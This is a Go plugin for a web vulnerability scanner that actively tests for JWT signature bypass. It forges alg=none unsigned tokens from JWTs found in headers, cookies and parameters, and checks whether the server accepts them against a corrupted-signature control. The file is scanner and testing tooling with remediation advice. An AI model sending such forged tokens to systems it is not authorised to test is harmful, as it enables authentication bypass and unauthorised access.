package plugin

import (
	"encoding/base64"
	"encoding/json"
	"strings"

	"jungle_happy_Scan/internal/diff"
	"jungle_happy_Scan/internal/httpraw"
	"jungle_happy_Scan/internal/model"
)

type JWTActive struct{}

func (JWTActive) Meta() model.PluginMeta {
	return StandardMeta("jwt_active", "JWT 签名校验绕过", "用损坏签名作为拒绝控制，仅在 alg=none 无签名令牌被稳定接受时报告。", "state-changing", true)
}

func (p JWTActive) Scan(ctx *Context) ([]model.Finding, error) {
	meta := p.Meta()
	candidates := jwtCandidates(ctx.Request, ctx.Points)
	total := max(1, len(candidates)*3)
	done := 0
	ctx.Progress(meta.ID, 0, total)
	for _, candidate := range candidates {
		raw, prefix := candidate.raw, candidate.prefix
		parts := strings.Split(raw, ".")
		var jwtHeader map[string]any
		decoded, err := base64.RawURLEncoding.DecodeString(parts[0])
		if err != nil || json.Unmarshal(decoded, &jwtHeader) != nil {
			continue
		}
		jwtHeader["alg"] = "none"
		encodedHeader, _ := json.Marshal(jwtHeader)
		noneToken := base64.RawURLEncoding.EncodeToString(encodedHeader) + "." + parts[1] + "."
		badToken := parts[0] + "." + parts[1] + ".jhs_invalid_signature_731"
		badRequest, err := candidate.mutate(ctx.Request, prefix+badToken)
		if err != nil {
			continue
		}
		bad, sendErr := ctx.Send(badRequest)
		if sendErr != nil {
			return nil, sendErr
		}
		done++
		ctx.Progress(meta.ID, done, total)
		if !diff.LikelyAuthDenied(bad, ctx.Config) {
			continue
		}
		noneRequest, err := candidate.mutate(ctx.Request, prefix+noneToken)
		if err != nil {
			continue
		}
		first, sendErr := ctx.Send(noneRequest)
		if sendErr != nil {
			return nil, sendErr
		}
		done++
		ctx.Progress(meta.ID, done, total)
		second, sendErr := ctx.Send(noneRequest)
		if sendErr != nil {
			return nil, sendErr
		}
		done++
		ctx.Progress(meta.ID, done, total)
		if diff.LikelyAuthDenied(first, ctx.Config) || diff.LikelyAuthDenied(second, ctx.Config) ||
			diff.Similarity(ctx.Baseline, first, ctx.Config) < 0.88 || diff.Similarity(ctx.Baseline, second, ctx.Config) < 0.88 ||
			diff.Similarity(first, second, ctx.Config) < 0.90 {
			continue
		}
		return []model.Finding{Finding(meta, "JWT alg=none 无签名令牌被接受", model.SeverityCritical, model.ConfidenceCertain, candidate.affected,
			"随机损坏签名被拒绝，而相同 Claims 的 alg=none 无签名令牌两次返回授权基线，确认服务端存在签名校验绕过。",
			"固定允许的签名算法并拒绝 none；由服务端密钥配置决定算法，不信任 token Header；统一升级 JWT 库。",
			[]model.Evidence{
				ctx.Evidence("损坏签名控制请求被拒绝", badRequest, &bad, map[string]any{"control": true}),
				ctx.Evidence("第一次 alg=none 请求被接受", noneRequest, &first, map[string]any{"paired_confirmed": true, "similarity": diff.Similarity(ctx.Baseline, first, ctx.Config)}),
				ctx.Evidence("第二次重复确认", noneRequest, &second, map[string]any{"repeat_confirmed": true}),
			}, "CWE-347")}, nil
	}
	ctx.Progress(meta.ID, total, total)
	return nil, nil
}

type jwtCandidate struct {
	raw, prefix, affected string
	header                string
	point                 *httpraw.InsertionPoint
}

func (candidate jwtCandidate) mutate(request *httpraw.Request, value string) (*httpraw.Request, error) {
	if candidate.header != "" {
		return request.WithHeader(candidate.header, value), nil
	}
	return httpraw.Mutate(request, *candidate.point, value)
}

// jwtCandidates covers Authorization/custom Headers as well as JWT values in
// Cookie, Query, Form and nested JSON. Session cookies are added explicitly
// because the generic business insertion-point finder intentionally excludes
// authentication fields from most active plugins.
func jwtCandidates(request *httpraw.Request, points []httpraw.InsertionPoint) []jwtCandidate {
	var result []jwtCandidate
	seen := make(map[string]bool)
	add := func(candidate jwtCandidate) {
		key := candidate.affected + "\x00" + candidate.raw
		if !seen[key] {
			seen[key] = true
			result = append(result, candidate)
		}
	}
	for _, header := range request.Headers {
		raw, prefix, ok := bearerJWT(header.Value)
		if ok {
			add(jwtCandidate{raw: raw, prefix: prefix, affected: "header:" + header.Name, header: header.Name})
		}
		if strings.EqualFold(header.Name, "Cookie") {
			for index, part := range strings.Split(header.Value, ";") {
				name, value, found := strings.Cut(strings.TrimSpace(part), "=")
				raw, prefix, ok := bearerJWT(value)
				if found && ok {
					point := httpraw.InsertionPoint{Location: "cookie", Name: name, Path: name, Value: value, Occurrence: index, ValueType: "string"}
					add(jwtCandidate{raw: raw, prefix: prefix, affected: point.Label(), point: &point})
				}
			}
		}
	}
	for index := range points {
		point := points[index]
		if point.Location == "header" || point.Location == "cookie" {
			continue
		}
		raw, prefix, ok := bearerJWT(point.Value)
		if ok {
			copyPoint := point
			add(jwtCandidate{raw: raw, prefix: prefix, affected: point.Label(), point: &copyPoint})
		}
	}
	return result
}

func bearerJWT(value string) (token, prefix string, ok bool) {
	trimmed := strings.TrimSpace(value)
	fields := strings.Fields(trimmed)
	if len(fields) == 2 && strings.EqualFold(fields[0], "Bearer") {
		trimmed, prefix = fields[1], fields[0]+" "
	}
	parts := strings.Split(trimmed, ".")
	if len(parts) != 3 || parts[0] == "" || parts[1] == "" {
		return trimmed, prefix, false
	}
	header, headerErr := base64.RawURLEncoding.DecodeString(parts[0])
	claims, claimsErr := base64.RawURLEncoding.DecodeString(parts[1])
	return trimmed, prefix, headerErr == nil && claimsErr == nil && json.Valid(header) && json.Valid(claims)
}
